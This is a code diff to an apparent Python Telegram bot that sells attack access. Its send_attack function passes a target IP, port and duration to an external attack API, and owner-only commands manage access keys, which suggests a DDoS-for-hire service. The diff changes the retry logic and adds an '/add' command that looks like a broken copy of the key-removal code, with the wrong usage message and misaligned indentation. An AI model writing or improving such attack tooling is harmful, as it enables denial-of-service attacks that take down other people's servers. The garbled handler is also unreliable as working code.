@@ -240,13 +240,13 @@ def stop_hosted_bot(bot_token):
     except:
         return False
 
-# ========== SEND ATTACK FUNCTION (CORRECT API FORMAT) ==========
+# ========== SEND ATTACK FUNCTION (FIXED) ==========
 def send_attack(ip, port, duration, chat_id, bot_instance, is_hosted=False, bot_token=None):
-    """Send attack to API with correct format"""
-    max_retries = 3
+    """Send attack to API - SAME as main bot"""
+    max_retries = 2
     for attempt in range(max_retries):
         try:
-            # Correct API format as per working example
+            # EXACT SAME parameters as working main bot
             api_params = {
                 "api_key": API_KEY,
                 "target": ip,
@@ -255,7 +255,8 @@ def send_attack(ip, port, duration, chat_id, bot_instance, is_hosted=False, bot_
                 "concurrent": 1
             }
             
-            response = requests.get(API_URL, params=api_params, timeout=30)
+            # Use GET request (same as main bot)
+            response = requests.get(API_URL, params=api_params, timeout=20)
             
             if response.status_code == 200:
                 time.sleep(duration)
@@ -263,28 +264,14 @@ def send_attack(ip, port, duration, chat_id, bot_instance, is_hosted=False, bot_
                 return True
             else:
                 if attempt < max_retries - 1:
-                    time.sleep(2)
+                    time.sleep(1)
                     continue
-                bot_instance.send_message(chat_id, f"❌ Attack failed! API Status: {response.status_code}")
+                bot_instance.send_message(chat_id, f"❌ Attack failed! Status: {response.status_code}")
                 return False
                 
-        except requests.exceptions.Timeout:
-            if attempt < max_retries - 1:
-                time.sleep(2)
-                continue
-            bot_instance.send_message(chat_id, "❌ Attack failed! API timeout.")
-            return False
-            
-        except requests.exceptions.ConnectionError:
-            if attempt < max_retries - 1:
-                time.sleep(2)
-                continue
-            bot_instance.send_message(chat_id, "❌ Attack failed! Cannot connect to API.")
-            return False
-            
         except Exception as e:
             if attempt < max_retries - 1:
-                time.sleep(2)
+                time.sleep(1)
                 continue
             bot_instance.send_message(chat_id, f"❌ Attack failed! {str(e)[:50]}")
             return False
@@ -1125,6 +1112,27 @@ def remove_key(msg):
     args = msg.text.split()
     if len(args) != 2:
         bot.reply_to(msg, "⚠️ Usage: /removekey KEY")
+        return
+    
+    key = args[1]
+    if key not in keys_data:
+        bot.reply_to(msg, "❌ Key not found!")
+        return
+    del keys_data[key]
+    save_keys(keys_data)
+    bot.reply_to(msg, f"✅ KEY REMOVED!\n🔑 Key: {key}")
+
+@bot.message_handler(commands=['add'])
+def add_user(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    args = msg.text.split()
+    if len(args) != 2:
+                bot.reply_to(msg, "⚠️ Usage: /removekey KEY")
         return
     
     key = args[1]
